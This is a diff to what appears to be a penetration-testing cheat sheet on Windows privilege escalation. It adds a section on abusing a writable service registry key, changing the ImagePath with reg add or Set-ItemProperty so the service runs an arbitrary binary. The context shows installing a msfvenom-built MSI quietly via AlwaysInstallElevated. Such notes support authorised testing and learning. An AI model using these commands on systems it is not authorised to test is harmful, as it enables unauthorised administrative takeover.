@@ -206,7 +206,8 @@ Get next run time with Get-ScheduledTaskInfo
 Get-ScheduledTaskInfo <TaskPath>\<TaskName>
 ```
 
-### Always Install elevated
+### Registry
+#### Always Install elevated
 
 Enumerate
 ```
@@ -222,6 +223,31 @@ Exploit
 # Create adminshell.msi with msfvenom
 
 msiexec /quiet /qn /i adminshell.msi
+```
+
+#### Write privilege
+
+Suppose a registry key of a service is writable by our user:
+```
+Get-Acl -Path HKLM:\system\currentcontrolset\services\<regsvc> | fl
+
+"OUR USER/GROUP"
+```
+
+Then we can modify the Image path to run an arbitrary binary
+```
+# cmd
+
+reg add HKLM\SYSTEM\CurrentControlSet\services\<regsvc> /v ImagePath /t REG_EXPAND_SZ /d "C:\path\to\binary.exe [arguments]" /f
+
+# powershell
+
+Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\<regsvc> -name ImagePath -value "C:\path\to\binary [arguments]"
+```
+
+Check if service is auto or manual start:
+```
+sc.exe qc <service name>
 ```
 
 # Spawning admin shell
